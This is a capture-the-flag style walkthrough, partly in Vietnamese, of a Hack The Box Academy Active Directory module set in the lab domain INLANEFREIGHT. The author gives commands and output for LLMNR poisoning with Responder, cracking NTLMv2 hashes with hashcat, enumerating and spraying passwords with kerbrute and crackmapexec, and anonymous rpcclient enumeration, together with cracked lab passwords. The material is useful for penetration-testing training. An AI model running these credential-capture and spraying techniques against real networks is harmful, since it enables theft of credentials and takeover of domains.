# External Recon and Enumeration Principles

#### Questions

+ 0  While looking at inlanefreights public records; A flag can be seen. Find the flag and submit it. ( format == HTB{******} )

```zsh
dig txt inlanefreight.com
```

![](images/1.png)


# Initial Enumeration of the Domain

#### Questions

 SSH to  with user "htb-student" and password "HTB_@cademy_stdnt!"

+ 0  From your scans, what is the "commonName" of host 172.16.5.5 ?

```zsh
sudo nmap -A -T 4 --min-rate 3000 172.16.5.5
```

![](images/2.png)
+ 0  What host is running "Microsoft SQL Server 2019 15.00.2000.00"? (IP address, not Resolved name)

```zsh
sudo nmap -A -T 4 --min-rate 3000 172.16.5.130
```

Để ý thông qua các dịch vụ khác ví dụ như SMB, ta hoàn toàn có thể xác định được phiên bản hệ điều hành của mục tiêu:

```zsh
ost script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: ACADEMY-EA-FILE, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b0:65:49 (VMware)
| smb2-time: 
|   date: 2025-05-22T16:58:47
|_  start_date: N/A
| ms-sql-info: 
|   172.16.5.130:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433

TRACEROUTE
HOP RTT     ADDRESS
1   0.92 ms 172.16.5.130
```
# LLMNR/NBT-NS Poisoning - from Linux
#### Questions

Answer the question(s) below to complete this Section and earn cubes!

Target(s): 10.129.84.172 (ACADEMY-EA-ATTACK01)   

 SSH to 10.129.84.172 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"

+ 0  Run Responder and obtain a hash for a user account that starts with the letter b. Submit the account name as your answer.

Kiểm tra NIC bằng lệnh  ifconfig, để ý NIC nào đang nằm trong mạng private 172.16.5.0/23.

```zsh
sudo responder -I ens224
```

Username bắt đầu với chữ cái 'b' có lẽ là `backupagent`, chúng ta đã có hàm băm của anh ta.

```zsh
[SMB] NTLMv2-SSP Client   : 172.16.5.130
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\backupagent
[SMB] NTLMv2-SSP Hash     : backupagent::INLANEFREIGHT:23572c9987011615:02E3581082858BC1736E5E87C22CEB3B:010100000000000080DAFDB21ECBDB01AB9B519A7F52D0D400000000020008004C0059005600420001001E00570049004E002D003300530030003000520049003500440052003200480004003400570049004E002D00330053003000300052004900350044005200320048002E004C005900560042002E004C004F00430041004C00030014004C005900560042002E004C004F00430041004C00050014004C005900560042002E004C004F00430041004C000700080080DAFDB21ECBDB0106000400020000000800300030000000000000000000000000300000C93CB54D77D08E579F8FA227B7403C0C00D37D6915DA97ADDAC344866684E0FA0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000   
```

+ 0  Crack the hash for the previous account and submit the cleartext password as your answer.

```zsh
hashcat -m 5600 backupagent_hash /usr/share/wordlists/rockyou.txt --show
BACKUPAGENT::INLANEFREIGHT:23572c9987011615:02e3581082858bc1736e5e87c22ceb3b:010100000000000080dafdb21ecbdb01ab9b519a7f52d0d400000000020008004c0059005600420001001e00570049004e002d003300530030003000520049003500440052003200480004003400570049004e002d00330053003000300052004900350044005200320048002e004c005900560042002e004c004f00430041004c00030014004c005900560042002e004c004f00430041004c00050014004c005900560042002e004c004f00430041004c000700080080dafdb21ecbdb0106000400020000000800300030000000000000000000000000300000c93cb54d77d08e579f8fa227b7403c0c00d37d6915da97addac344866684e0fa0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:h1backup55
```

+ 0  Run Responder and obtain an NTLMv2 hash for the user wley. Crack the hash using Hashcat and submit the user's password as your answer.

```zsh
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\wley
[SMB] NTLMv2-SSP Hash     : wley::INLANEFREIGHT:2dd7b9c6ef0621c9:A16D599B6E621ED7F4AFE7EF7FEABFAE:010100000000000080DAFDB21ECBDB01570442FC64E5BB3700000000020008004C0059005600420001001E00570049004E002D003300530030003000520049003500440052003200480004003400570049004E002D00330053003000300052004900350044005200320048002E004C005900560042002E004C004F00430041004C00030014004C005900560042002E004C004F00430041004C00050014004C005900560042002E004C004F00430041004C000700080080DAFDB21ECBDB0106000400020000000800300030000000000000000000000000300000C93CB54D77D08E579F8FA227B7403C0C00D37D6915DA97ADDAC344866684E0FA0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
```

```zsh
hashcat -m 5600 wley_ntlm2 /usr/share/wordlists/rockyou.txt --show
WLEY::INLANEFREIGHT:2dd7b9c6ef0621c9:a16d599b6e621ed7f4afe7ef7feabfae:010100000000000080dafdb21ecbdb01570442fc64e5bb3700000000020008004c0059005600420001001e00570049004e002d003300530030003000520049003500440052003200480004003400570049004e002d00330053003000300052004900350044005200320048002e004c005900560042002e004c004f00430041004c00030014004c005900560042002e004c004f00430041004c00050014004c005900560042002e004c004f00430041004c000700080080dafdb21ecbdb0106000400020000000800300030000000000000000000000000300000c93cb54d77d08e579f8fa227b7403c0c00d37d6915da97addac344866684e0fa0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:transporter@4
```

#### Questions

Answer the question(s) below to complete this Section and earn cubes!

Target(s): 10.129.63.80 (ACADEMY-EA-MS01)   

 RDP to 10.129.63.80 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!"

+ 0  Run Inveigh and capture the NTLMv2 hash for the svc_qualys account. Crack and submit the cleartext password as the answer.

```zsh
xfreerdp3 /v:10.129.63.80 /u:htb-student /p:'Academy_student_AD!'
```

![](images/3.png)

![](images/4.png)

```zsh
hashcat -m 5600 svc_qualys_hash /usr/share/wordlists/rockyou.txt --show
SVC_QUALYS::INLANEFREIGHT:fbd25250c1cf01fc:a897d994b7336d08fdde792447277228:01010000000000002bcc657445cbdb01c3976282919e5a5c0000000002001a0049004e004c0041004e004500460052004500490047004800540001001e00410043004100440045004d0059002d00450041002d004d005300300031000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c0003004600410043004100440045004d0059002d00450041002d004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00070008002bcc657445cbdb0106000400020000000800300030000000000000000000000000300000212a62e653617373c62fda0966078637ae053fc4dcf8d5810d6cc249634926450a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0035002e00320035000000000000000000:security#1
```
# Enumerating & Retrieving Password Policies

#### Questions

Answer the question(s) below to complete this Section and earn cubes!

Target(s): 10.129.200.73 (ACADEMY-EA-ATTACK01)   

 SSH to 10.129.200.73 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"

+ 0  What is the default Minimum password length when a new domain is created? (One number)

| Policy                                      | Default Value |
| ------------------------------------------- | ------------- |
| Enforce password history                    | 24 days       |
| Maximum password age                        | 42 days       |
| Minimum password age                        | 1 day         |
| Minimum password length                     | 7             |
| Password must meet complexity requirements  | Enabled       |
| Store passwords using reversible encryption | Disabled      |
| Account lockout duration                    | Not set       |
| Account lockout threshold                   | 0             |
| Reset account lockout counter after         | Not set       |

+ 0  What is the minPwdLength set to in the INLANEFREIGHT.LOCAL domain? (One number)
```zsh
rpcclient -U "" -N 172.16.5.5

rpcclient $> querydominfo
Domain:         INLANEFREIGHT
Server:
Comment:
Total Users:    3509
Total Groups:   0
Total Aliases:  203
Sequence No:    1
Force Logoff:   -1
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1

rpcclient $> getdompwinfo
min_password_length: 8
password_properties: 0x00000001
        DOMAIN_PASSWORD_COMPLEX
        
rpcclient $> 
```

# Password Spraying - Making a Target User List

#### Questions

Answer the question(s) below to complete this Section and earn cubes!

Target(s): 10.129.200.73 (ACADEMY-EA-ATTACK01)   

 SSH to 10.129.200.73 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"

+ 0  Enumerate valid usernames using Kerbrute and the wordlist located at /opt/jsmith.txt on the ATTACK01 host. How many valid usernames can we enumerate with just this wordlist from an unauthenticated standpoint?

```zsh
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt > valid-users

cat valid-users
```

![](images/5.png)

# Internal Password Spraying - from Linux

#### Questions

Answer the question(s) below to complete this Section and earn cubes!

Target(s): 10.129.200.73 (ACADEMY-EA-ATTACK01)   

 SSH to 10.129.200.73 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"

+ 0  Find the user account starting with the letter "s" that has the password Welcome1. Submit the username as your answer.

```zsh
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt > valid-users
```

Lọc ra các username có kí tự 's' ở đầu tên:

```zsh
cat valid-users | grep 'VALID' | cut -d' ' -f8 | grep '^s' | cut -d'@' -f1
sbrown
srosario
sinman
strent
sgage

cat valid-users | grep 'VALID' | cut -d' ' -f8 | grep '^s' | cut -d'@' -f1  > valid.txt
```

Tiến hành spray password

```zsh
sudo crackmapexec smb 172.16.5.5 -u valid.txt -p Welcome1 | grep +
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sgage:Welcome1
```

# Internal Password Spraying - from Windows

#### Questions
 RDP to 10.129.232.141 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!"

+ 0  Using the examples shown in this section, find a user with the password Winter2022. Submit the username as the answer.

```powershell
Import-Module .\DomainPasswordSpray.ps1

Invoke-DomainPasswordSpray -Password -OutFile spray_success -ErrorAction SilentlyContinue
```

![](images/6.png)


# Credentialed Enumeration - from Linux

#### Questions

Answer the question(s) below to complete this Section and earn cubes!

Target(s): 10.129.231.114 (ACADEMY-EA-ATTACK01)   

 SSH to 10.129.231.114 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"

+ 0  What AD User has a RID equal to Decimal 1170?

Convert 1170 dec to hex: 492

```zsh
rpcclient -U "" -N 172.16.5.5

rpcclient $> queryuser 0x492
        User Name   :   mmorgan
        Full Name   :   Matthew Morgan
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Thu, 10 Mar 2022 14:48:06 EST
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 31 Dec 1969 19:00:00 EST
        Password last set Time   :      Tue, 05 Apr 2022 15:34:55 EDT
        Password can change Time :      Wed, 06 Apr 2022 15:34:55 EDT
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0x492
        group_rid:      0x201
        acb_info :      0x00010210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000018
        padding1[0..7]...
        logon_hrs[0..21]...

```

+ 0  What is the membercount: of the "Interns" group?

```zsh
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -m Interns

+] Using Domain Controller at: 172.16.5.5
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=INLANEFREIGHT,DC=LOCAL
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      u:INLANEFREIGHT\forend
[+] Attempting to enumerate full DN for group: Interns
[+] Found 2 results:

0: CN=Interns,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
1: OU=Interns,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL

Which DN do you want to use? : 0
[+]      Found 10 members:

b'CN=Helen Griffin,OU=Interns,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL'
b'CN=Marty Tsosie,OU=Interns,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL'
b'CN=Raymond Perry,OU=Interns,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL'
b'CN=Anne Rey,OU=Interns,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL'
b'CN=Alton Lawless,OU=Interns,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL'
b'CN=Ervin Brown,OU=Interns,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL'
b'CN=Ruth Milliman,OU=Interns,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL'
b'CN=Richard Butler,OU=Interns,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL'
b'CN=Enriqueta Green,OU=Interns,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL'
b'CN=Henry Yanez,OU=Interns,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL'

[*] Bye!
```

# Credentialed Enumeration - from Windows

#### Questions

Answer the question(s) below to complete this Section and earn cubes!

Target(s): 10.129.175.83 (ACADEMY-EA-MS01)   


 RDP to 10.129.175.83 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!"

+ 0  Using Bloodhound, determine how many Kerberoastable accounts exist within the INLANEFREIGHT domain. (Submit the number as the answer)

Chạy SharpHound lấy kết quả tải lên BloodHound GUI.
Chạy truy vấn sau để tìm kiếm người dùng kerberoastable trên một domain cụ thể:

```cypher
MATCH (d:Domain {name: "INLANEFREIGHT.LOCAL"}), (u:User {hasspn: true})
WHERE u.domainsid = d.objectid
RETURN u
```

![](images/7.png)

+ 0  What PowerView function allows us to test if a user has administrative access to a local or remote host?
|   |   |
|---|---|
|**Computer Enumeration Functions:**||
|`Get-NetLocalGroup`|Enumerates local groups on the local or a remote machine|
|`Get-NetLocalGroupMember`|Enumerates members of a specific local group|
|`Get-NetShare`|Returns open shares on the local (or a remote) machine|
|`Get-NetSession`|Will return session information for the local (or a remote) machine|
|`Test-AdminAccess`|Tests if the current user has administrative access to the local (or a remote) machine|

+ 0  Run Snaffler and hunt for a readable web config file. What is the name of the user in the connection string within the file?
![](images/8.png)

+ 0  What is the password for the database user?

ILFREIGHTDB01!


# Living Off the Land

#### Questions

Answer the question(s) below to complete this Section and earn cubes!


 RDP to 10.129.175.83 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!"

+ 0  Enumerate the host's security configuration information and provide its AMProductVersion.
```powershell
Get-MpComputerStatus
AMEngineVersion                 : 0.0.0.0
AMProductVersion                : 4.18.2109.6
AMRunningMode                   : Not running
AMServiceEnabled                : False
AMServiceVersion                : 0.0.0.0
AntispywareEnabled              : False
AntispywareSignatureAge         : 4294967295
AntispywareSignatureLastUpdated : 
AntispywareSignatureVersion     : 0.0.0.0
AntivirusEnabled                : False
AntivirusSignatureAge           : 4294967295
AntivirusSignatureLastUpdated   : 
AntivirusSignatureVersion       : 0.0.0.0
BehaviorMonitorEnabled          : False
ComputerID                      : 077DD3DD-5AF2-43E2-900E-D8B5FF616DFA
ComputerState                   : 0
FullScanAge                     : 4294967295
FullScanEndTime                 : 
FullScanStartTime               : 
IoavProtectionEnabled           : False
IsTamperProtected               : False
IsVirtualMachine                : True
LastFullScanSource              : 0
LastQuickScanSource             : 0
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
NISSignatureAge                 : 4294967295
NISSignatureLastUpdated         : 
NISSignatureVersion             : 0.0.0.0
OnAccessProtectionEnabled       : False
QuickScanAge                    : 4294967295
QuickScanEndTime                : 
QuickScanStartTime              : 
RealTimeProtectionEnabled       : False
RealTimeScanDirection           : 0
TamperProtectionSource          : N/A
TDTMode                         : N/A
TDTStatus                       : N/A
TDTTelemetry                    : N/A
PSComputerName                  : 
```


+ 0  What domain user is explicitly listed as a member of the local Administrators group on the target host?

Đầu tiên, đơn giản là liệt kê tất cả members của nhóm Local Admin:

```powershell
net localgroup Administrators
```

```powershell
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
INLANEFREIGHT\adunn
INLANEFREIGHT\Domain Admins
INLANEFREIGHT\Domain Users
The command completed successfully.
```

Dễ dàng thấy rằng các nhóm thuộc miền Inlanefreight là Domain Admins và Domain Users cũng thuộc nhóm quản trị viên cục bộ của máy chủ này. Ở đây có thêm một user rõ ràng là `adunn`, rõ ràng câu trả lời là người dùng này vì anh ta thuộc miền INLANEFREIGHT.LOCAL

+ 0  Utilizing techniques learned in this section, find the flag hidden in the description field of a disabled account with administrative privileges. Submit the flag as the answer.

Đầu tiên chúng ta cần lọc ra những tài khoản mà disabled bằng dsquery: userAccountControl:1.2.840.113556.1.4.803:=2

```powershell
PS C:\Tools> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=2)" -limit 0 -attr sAMAccountName
  sAMAccountName
  krbtgt
  sm_752cbd23e73649258
  sm_8b3ff26494d94da89
  sm_434e56f7c43f4534a
  sm_51dc5f77b78546d7b
  sm_c6ccf50003bf4310b
  sm_c7c8c6f5727449fbb
  sm_925f7acdff9344408
  sm_820598b3d6c548a08
  sm_8f47aca8186c4f0da
  $725000-9jb50uejje9f
  bross
  guest
```

Sau đó chúng ta tìm thông tin chi tiết, có user nào thuộc OU hoặc có CN là 'Admin' / 'Domain Admin' không.... hay có quyền admin ở bất cứ bộ phận nào...

```powershell
PS C:\Tools> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=2)" -limit 0
"CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Jessica Msexchapproval 1F05a927-3Be2-4Fb9-Aa03-B59fe3b56f4c,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Jessica Systemmailbox Bb558c35-97F1-4Cb9-8Ff7-D53741dc928c,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Jessica Msexchdiscovery E0dc1c29-89C3-4034-B678-E6c29d823ed9,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Jessica Msexchdiscoverymailbox D919ba05-46A6-415F-80Ad-7E09334bb852,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Jessica Migration.8F3e7716-2011-43E4-96B1-Aba62d229136,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Jessica Federatedemail.4C1f4d8b-8179-4148-93Bf-00A95fa1e042,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Jessica Systemmailbox{D0e409a0-Af9b-4720-92Fe-Aac869b0d201},CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Jessica Systemmailbox{2Ce34405-31Be-455D-89D7-A7c7da7a0daa},CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Jessica Systemmailbox 8Cc370d3-822A-4Ab8-A926-Bb94bd0641a9,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Jessica Ramsey,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Betty Ross,OU=IT Admins,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

Dễ dàng thấy rằng người dùng "CN=Betty Ross,OU=IT Admins,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL" thuộc nhóm IT Admins. Do đó đối chiếu với sAMAccountName, username của anh ta là `bross`

Chúng ta sẽ kiểm tra kĩ user này bằng lệnh:

```powershell
net user bross /domain
```

```powershell
PS C:\Tools> net user bross /domain
The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

User name                    bross
Full Name                    Betty Ross
Comment                      HTB{LD@P_I$_W1ld}
User's comment
Country/region code          000 (System Default)
Account active               No
Account expires              Never

Password last set            10/27/2021 10:37:07 AM
Password expires             Never
Password changeable          10/28/2021 10:37:07 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *File Share G Drive   *File Share H Drive
                             *Printer Access       *Contractors
                             *Domain Admins        *Domain Users
                             *VPN Users            *Shared Calendar Read
The command completed successfully.
```